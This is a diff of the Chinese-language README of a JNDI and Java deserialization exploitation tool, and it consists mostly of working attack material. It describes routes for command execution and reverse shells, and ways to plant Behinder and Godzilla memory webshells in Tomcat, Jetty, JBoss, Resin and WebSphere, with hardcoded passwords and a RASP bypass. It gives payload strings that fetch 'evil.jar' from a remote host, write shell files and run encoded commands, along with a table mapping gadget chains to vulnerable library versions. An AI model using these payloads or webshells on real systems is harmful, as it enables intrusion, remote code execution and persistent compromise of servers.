@@ -69,8 +69,10 @@ Supported LADP Queries：
     * ```nu1r```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
     * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
     * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
-    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
-    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
+    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami```
+      的方式传递想要执行的命令
+    * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
+      时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
 * ```WebsphereBypass``` 中的 3 个动作：
     * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
     * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
@@ -90,53 +92,60 @@ Supported LADP Queries：
 # 🦄内存马
 
 两种添加方式：
+
 - 支持引用远程类加载方式打入（Basic路由）。
 - 支持本地工厂类加载方式打入（TomcatBypass路由）。
-  
+
 使用说明：
+
 - bx: 冰蝎内存马，```key: nu1ryyds```, ```Referer：https://nu1r.cn/```
 - gz: 哥斯拉内存马，```pass: nu1r```, ```Referer：https://nu1r.cn/```
 - gzraw: 哥斯拉 raw 类型的内存马, ```pass: nu1r```, ```Referer：https://nu1r.cn/```
 - cmd: cmd命令回显内存马。
 - 参数```obscure```，则使用反射绕过RASP。
-不指定类型就默认为冰蝎马。
+  不指定类型就默认为冰蝎马。
+
 ```
 ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/urlls-bx-obscure
 ```
 
 支持自定义路径：
 不指定时默认路径为nu1r，示例中的rlls就是重新指定的路径。
+
 ```
 ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-obscure
 ```
 
 Agent写入：
 因为无Jar落地所以分`winAgent`与`linAgent`实现。
+
 ```
 ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-linAgent
 ```
 
 内存马说明：
-  * ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
+
+* ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
     - X-nu1r-TOKEN 如果为 ce 则执行命令 , ?X-Token-Data=cmd
     - X-nu1r-TOKEN 如果为 bx 则为冰蝎马 密码 nu1ryyds
     - X-nu1r-TOKEN 如果为 gz 则为哥斯拉马 pass nu1r key nu1ryyds
-  * ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
-  * ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
-  * ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
-  * ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
-  * ```resinFilterTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
-  * ```resinServletTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
-  * ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
-  * ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
-  * ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
-  * ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
-  * ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
-  * ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
-  * ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
-  * ```WSFilter```: `CMD` 命令回显 WebSocket 内存马，`cmd命令回显`
-  * ```TomcatExecutor``` : Executor 内存马，`cmd命令回显`
-  * ```TomcatUpgrade```: TomcatUpgrade 内存马，`cmd命令回显`
+* ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
+* ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
+* ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
+* ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
+* ```resinFilterTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
+* ```resinServletTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
+* ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
+* ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
+* ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
+* ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
+* ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
+* ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
+* ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
+* ```WSFilter```: `CMD` 命令回显 WebSocket 内存马，`cmd命令回显`
+* ```TomcatExecutor``` : Executor 内存马，`cmd命令回显`
+* ```TomcatUpgrade```: TomcatUpgrade 内存马，`cmd命令回显`
+
 ---
 
 # 👻其他利用链的拓展
@@ -153,7 +162,8 @@ TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序�
 ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/TS-10
 ```
 
-RC ：Remote Call - 通过 URLClassLoader.loadClass() 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
+RC ：Remote Call - 通过 URLClassLoader.loadClass()
+来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
 
 ```
 ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/RC-http://xxxx.com/evil.jar#EvilClass
@@ -242,55 +252,55 @@ jndiNuSig = func(Payload) {
 
 # 🕷️Deserialization路由
 
-| Gadget                                          | 依赖                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
-|:------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| AspectJWeaver                                   | aspectjweaver:1.9.2<br/>commons-collections:3.2.2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| BeanShell1                                      | org.beanshell:bsh:2.0b5                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
-| C3P0                                            | com.mchange:c3p0:0.9.5.2<br/>mchange-commons-java:0.2.11                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
-| C3P02                                           | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| C3P03                                           | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.codehaus.groovy:groovy:2.3.9                                                                                                                                                                                                                                                                                                                                                                                                      |
-| C3P04                                           | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.yaml:snakeyaml:1.30                                                                                                                                                                                                                                                                                                                                                                                                               |
-| C3P092                                          | com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8<br/>com.mchange:mchange-commons-java:0.2.11                                                                                                                                                                                                                                                                                                                                                                                                                                                |
-| Click1                                          | org.apache.click:click-nodeps:2.3.0<br/>javax.servlet:javax.servlet-api:3.1.0                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
-| Clojure                                         | org.clojure:clojure:1.8.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
-| CommonsBeanutils1                               | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2                                                                                                                                                                                                                                                                                                                                                                                                           |
-| CommonsBeanutils2                               | commons-beanutils:commons-beanutils:1.9.2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
-| CommonsBeanutils2NOCC                           | commons-beanutils:commons-beanutils:1.8.3<br/>commons-logging:commons-logging:1.2                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| CommonsBeanutils1183NOCC                        | commons-beanutils:commons-beanutils:1.8.3                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
-| CommonsCollections1                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections2                             | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections3                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections4                             | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections5                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections6<br/>CommonsCollections6Lite | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections6Lite_4                       | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections7                             | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections7Lite_4                       | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections8                             | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| CommonsCollections9                             | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
-| CommonsCollections10                            | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
-| CommonsCollectionsK1                            | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
-| CommonsCollectionsK2                            | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| Groovy1                                         | org.codehaus.groovy:groovy:2.3.9                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
-| Hibernate1                                      | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
-| Hibernate2                                      | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
-| JavassistWeld1                                  | javassist:javassist:3.12.1.GA<br/>org.jboss.weld:weld-core:1.1.33.Final<br/>javax.interceptor:javax.interceptor-api:3.1<br/>javax.enterprise:cdi-api:1.0-SP1<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final<br/>org.slf4j:slf4j-api:1.7.21                                                                                                                                                                                                                                                                                     |
-| JBossInterceptors1                              | javassist:javassist:3.12.1.GA<br/>org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final<br/>javax.enterprise:cdi-api:1.0-SP1<br/>javax.interceptor:javax.interceptor-api:3.1<br/>org.slf4j:slf4j-api:1.7.21<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final                                                                                                                                                                                                                                                                  |
-| Jdk7u21                                         | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| Jdk7u21variant                                  | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| JSON1                                           | net.sf.json-lib:json-lib:jar:jdk15:2.4<br/>org.springframework:spring-aop:4.1.4.RELEASE                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
-| Jython1                                         | org.python:jython-standalone:2.5.2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
-| MozillaRhino1                                   | rhino:js:1.7R2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
-| MozillaRhino2                                   | rhino:js:1.7R2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
-| Myfaces1                                        | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| Myfaces2                                        | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| RenderedImage                                   | javax.media:jai-codec-1.1.3                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| ROME                                            | rome:rome:1.0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
-| ROME2                                           | rome:rome:1.0<br/>JDK 8+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
-| Spring1                                         | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-beans:4.1.4.RELEASE                                                                                                                                                                                                                                                                                                                                                                                                                                            |
-| Spring2                                         | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-aop:4.1.4.RELEASE<br/>aopalliance:aopalliance:1.0<br/>commons-logging:commons-logging:1.2                                                                                                                                                                                                                                                                                                                                                                      |
-| Spring3                                         | org.springframework:spring-tx:5.2.3.RELEASE<br/>org.springframework:spring-context:5.2.3.RELEASE<br/>javax.transaction:javax.transaction-api:1.2                                                                                                                                                                                                                                                                                                                                                                                            |
-| Vaadin1                                         | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
+| Gadget                                       | 依赖                                                                                                                                                                                                                                                                         |         |
+|:---------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------|
+| AspectJWeaver                                | aspectjweaver:1.9.2<br/>commons-collections:3.2.2                                                                                                                                                                                                                          |         |
+| BeanShell1                                   | org.beanshell:bsh:2.0b5                                                                                                                                                                                                                                                    |         |
+| C3P0                                         | com.mchange:c3p0:0.9.5.2<br/>mchange-commons-java:0.2.11                                                                                                                                                                                                                   |         |
+| C3P02                                        | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35                                                                                                                                                                          |         |
+| C3P03                                        | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.codehaus.groovy:groovy:2.3.9                                                                                                                                     |         |
+| C3P04                                        | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.yaml:snakeyaml:1.30                                                                                                                                              |         |
+| C3P092                                       | com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8<br/>com.mchange:mchange-commons-java:0.2.11                                                                                                                                                                               |         |
+| Click1                                       | org.apache.click:click-nodeps:2.3.0<br/>javax.servlet:javax.servlet-api:3.1.0                                                                                                                                                                                              |         |
+| Clojure                                      | org.clojure:clojure:1.8.0                                                                                                                                                                                                                                                  |         |
+| CommonsBeanutils1                            | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2                                                                                                                                          |         |
+| CommonsBeanutils2                            | commons-beanutils:commons-beanutils:1.9.2                                                                                                                                                                                                                                  | 可打shiro |
+| CommonsBeanutils2NOCC                        | commons-beanutils:commons-beanutils:1.8.3<br/>commons-logging:commons-logging:1.2                                                                                                                                                                                          |         |
+| CommonsBeanutils1183NOCC                     | commons-beanutils:commons-beanutils:1.8.3                                                                                                                                                                                                                                  |         |
+| CommonsCollections1                          | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |         |
+| CommonsCollections2                          | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |         |
+| CommonsCollections3                          | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |         |
+| CommonsCollections4                          | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |         |
+| CommonsCollections5                          | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |         |
+| CommonsCollections6<br/>CommonsCollectionsK3 | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |         |
+| CommonsCollectionsK4                         | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |         |
+| CommonsCollections7                          | commons-collections:commons-collections:3.1                                                                                                                                                                                                                                |         |
+| CommonsCollectionsK5                         | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |         |
+| CommonsCollections8                          | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |         |
+| CommonsCollections9                          | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |         |
+| CommonsCollections10                         | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |         |
+| CommonsCollectionsK1                         | commons-collections:commons-collections:3.2.1                                                                                                                                                                                                                              |         |
+| CommonsCollectionsK2                         | org.apache.commons:commons-collections4:4.0                                                                                                                                                                                                                                |         |
+| Groovy1                                      | org.codehaus.groovy:groovy:2.3.9                                                                                                                                                                                                                                           |         |
+| Hibernate1                                   | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |         |
+| Hibernate2                                   | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final                                                                                                                                                                                     |         |
+| JavassistWeld1                               | javassist:javassist:3.12.1.GA<br/>org.jboss.weld:weld-core:1.1.33.Final<br/>javax.interceptor:javax.interceptor-api:3.1<br/>javax.enterprise:cdi-api:1.0-SP1<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final<br/>org.slf4j:slf4j-api:1.7.21                    |         |
+| JBossInterceptors1                           | javassist:javassist:3.12.1.GA<br/>org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final<br/>javax.enterprise:cdi-api:1.0-SP1<br/>javax.interceptor:javax.interceptor-api:3.1<br/>org.slf4j:slf4j-api:1.7.21<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final |         |
+| Jdk7u21                                      | -                                                                                                                                                                                                                                                                          |         |
+| Jdk7u21variant                               | -                                                                                                                                                                                                                                                                          |         |
+| JSON1                                        | net.sf.json-lib:json-lib:jar:jdk15:2.4<br/>org.springframework:spring-aop:4.1.4.RELEASE                                                                                                                                                                                    |         |
+| Jython1                                      | org.python:jython-standalone:2.5.2                                                                                                                                                                                                                                         |         |
+| MozillaRhino1                                | rhino:js:1.7R2                                                                                                                                                                                                                                                             |         |
+| MozillaRhino2                                | rhino:js:1.7R2                                                                                                                                                                                                                                                             |         |
+| Myfaces1                                     | -                                                                                                                                                                                                                                                                          |         |
+| Myfaces2                                     | -                                                                                                                                                                                                                                                                          |         |
+| RenderedImage                                | javax.media:jai-codec-1.1.3                                                                                                                                                                                                                                                |         |
+| ROME                                         | rome:rome:1.0                                                                                                                                                                                                                                                              |         |
+| ROME2                                        | rome:rome:1.0<br/>JDK 8+                                                                                                                                                                                                                                                   |         |
+| Spring1                                      | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-beans:4.1.4.RELEASE                                                                                                                                                                           |         |
+| Spring2                                      | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-aop:4.1.4.RELEASE<br/>aopalliance:aopalliance:1.0<br/>commons-logging:commons-logging:1.2                                                                                                     |         |
+| Spring3                                      | org.springframework:spring-tx:5.2.3.RELEASE<br/>org.springframework:spring-context:5.2.3.RELEASE<br/>javax.transaction:javax.transaction-api:1.2                                                                                                                           |         |
+| Vaadin1                                      | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14                                                                                                                                                                                                        |         |
 
 * 使用示例：
   ```
@@ -321,58 +331,71 @@ jndiNuSer = func(Payload) {
 
 ---
 对于Gadget：
+
 - CommonsCollections1
 - CommonsCollections5
 - CommonsCollections6
-- CommonsCollections6Lite
-- CommonsCollections6Lite_4
+- CommonsCollectionsK3
+- CommonsCollectionsK4
 - CommonsCollections7
-- commonscollections7lite_4
+- commonscollectionsK5
 - CommonsCollections9
 
 为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：
 
 TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#TS-10)}}
 ```
 
-RC ：Remote Call - 通过 URLClassLoader.loadClass() 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
+RC ：Remote Call - 通过 URLClassLoader.loadClass()
+来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#RC-http://xxxx.com/evil.jar#EvilClass)}}
 ```
 
 WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#d2hvYW1p
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#WF-/tmp/shell#d2hvYW1p)}}
 ```
 
-PB ：ProcessBuilder 通过 ProcessBuilder.start() 来执行系统命令，使用命令 ```PB-lin-d2hvYW1p``` / ```PB-win-d2hvYW1p``` 分别在不同操作系统执行命令
+PB ：ProcessBuilder 通过 ProcessBuilder.start() 来执行系统命令，使用命令 ```PB-lin-d2hvYW1p``` / ```PB-win-d2hvYW1p```
+分别在不同操作系统执行命令
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==)}}
 ```
 
-SE ：ScriptEngine - 通过 ScriptEngineManager.getEngineByName('js').eval() 来解析 JS 代码调用 Runtime 执行命令，使用命令 SE-d2hvYW1
+SE ：ScriptEngine - 通过 ScriptEngineManager.getEngineByName('js').eval() 来解析 JS 代码调用 Runtime 执行命令，使用命令
+SE-d2hvYW1
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#SE-d2hvYW1)}}
 ```
 
 DL ：DNS LOG - 通过 InetAddress.getAllByName() 来触发 DNS 解析，使用命令 DL-xxxdnslog.cn
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#DL-xxxdnslog.cn)}}
 ```
 
 HL ：HTTP LOG - 通过 URL.getContent() 来触发 HTTP LOG，使用命令 HL-http://xxx.com
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#HL-http://xxx.com)}}
 ```
 
 BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() 来加载 BCEL 类字节码，使用命令 BC-$BCEL$xxx
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#BC-$BCEL$xxx)}}
 ```
 
 其他：普通命令执行 - 通过 Runtime.getRuntime().exec() 执行系统命令，使用命令 whoami
+
 ```
 {{yak(jndiNuSer|${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/nu1rNew}#whoami)}}
 ```
